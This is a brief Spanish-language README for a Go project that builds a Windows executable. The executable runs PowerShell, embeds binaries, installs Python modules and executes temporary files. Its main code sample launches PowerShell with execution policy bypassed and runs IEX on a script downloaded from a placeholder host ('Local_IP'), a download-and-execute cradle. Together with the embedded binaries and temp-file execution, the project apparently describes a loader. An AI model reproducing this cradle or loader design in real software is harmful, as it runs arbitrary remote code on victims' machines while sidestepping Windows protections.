## Características

- Ejecución de comandos PowerShell desde Go.
- Uso de `embed.FS` para incluir archivos binarios en el ejecutable.
- Verificación e instalación de Python y módulos requeridos.
- Creación y ejecución de archivos temporales.
- Cross-compiling para Windows desde Linux/macOS.

Compila el ejecutable para Windows:

```sh
GOOS=windows GOARCH=amd64 go build -o program.exe
```

O compila directamente en Windows:

```sh
go build -o program.exe
```

### Ejecución de PowerShell desde Go

```go
cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command",
    "IEX (New-Object Net.WebClient).DownloadString('http://Local_IP/powershellfile.txt')")
output, err := cmd.CombinedOutput()
if err != nil {
    fmt.Println("Error ejecutando el comando:", err)
    return
}
fmt.Println("Salida del comando:", string(output))
```

### Verificación e Instalación de Python y Módulos

```go
func EnsurePythonInstalled() {
    cmd := exec.Command("python", "--version")
    err := cmd.Run()
    if err != nil {
        log.Fatalf("Python no está instalado o no está en el PATH.")
    }
    fmt.Println("Python está instalado.")
}
```
